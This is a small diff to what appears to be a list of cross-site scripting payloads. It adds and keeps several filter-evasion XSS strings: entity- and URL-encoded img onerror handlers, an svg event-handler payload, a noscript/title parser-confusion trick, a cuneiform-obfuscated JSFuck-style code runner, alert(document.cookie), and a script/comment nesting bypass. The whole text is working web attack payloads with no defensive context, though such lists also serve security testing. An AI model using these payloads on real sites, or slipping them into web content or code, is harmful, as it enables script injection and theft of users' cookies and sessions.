@@ -1,4 +1,5 @@
-<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+<svg%0Aonauxclick=0;[1].some(confirm)//<noscript><p title="</noscript><img src=x onerror=alert(1)>">
 𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
 alert?.(document?.cookie)
 <script>x = '<!--<script>'/*</script>-->*/;alert(1)</script
